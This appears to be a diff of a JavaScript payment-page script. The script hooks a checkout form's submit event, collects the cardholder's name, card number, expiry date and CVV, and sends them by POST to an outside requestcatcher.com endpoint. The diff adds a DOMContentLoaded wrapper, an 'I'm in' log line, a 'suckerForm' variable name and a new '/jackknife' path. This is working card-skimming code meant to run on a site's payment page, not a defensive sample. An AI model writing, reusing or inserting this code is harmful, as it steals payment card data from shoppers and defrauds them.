@@ -1,27 +1,29 @@
-const paymentForm = document.getElementById('payment-form');
+console.log("I'm in");
 
-paymentForm.addEventListener('submit', async (event) => {
-    // Remove any spaces the user might have entered
-    const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');
+window.addEventListener('DOMContentLoaded', () => {
+    const suckerForm = document.getElementById('payment-form');
 
-    if (!validateLuhn(rawValue)) {
-        alert("Gotcha");
+    suckerForm.addEventListener('submit', async () => {
+        // Remove any spaces the user might have entered
+        const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');
 
-        const userData = {
-            nameOnCard: paymentForm.getElementById('card-name').value,
-            cardNumber: paymentForm.getElementById('card-number').value,
-            expiryDate: paymentForm.getElementById('expiry').value,
-            cvv: paymentForm.getElementById('cvv').value
+        if (!validateLuhn(rawValue)) {
+            const userData = {
+                nameOnCard: document.getElementById('card-name').value,
+                cardNumber: document.getElementById('card-number').value,
+                expiryDate: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value
+            }
+
+            console.log(userData);
+
+            await fetch("https://madwolf.requestcatcher.com/jackknife", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            });
         }
-
-        alert(userData);
-
-        await fetch("https://madwolf.requestcatcher.com/test", {
-            method: "POST",
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(userData)
-        });
-    }
+    });
 });
